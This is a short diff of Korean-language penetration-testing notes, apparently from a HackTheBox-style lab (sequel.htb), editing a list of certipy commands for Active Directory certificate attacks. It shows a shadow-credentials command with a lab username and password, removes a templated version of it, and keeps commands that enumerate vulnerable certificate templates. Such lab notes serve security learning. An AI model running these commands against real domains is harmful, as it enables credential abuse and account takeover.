@@ -779,8 +779,6 @@ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc
 
 - `nmap`으로 스캔하여 `CA`를 발견하면 시도.
 ```bash
-certipy-ad shadow auto -u <user> -p <password> -account <account> -dc-ip <ip>
-
 certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable
 
 certipy-ad find -u <user> -p <password> -target <domain/FQDN> -text -stdout -vulnerable
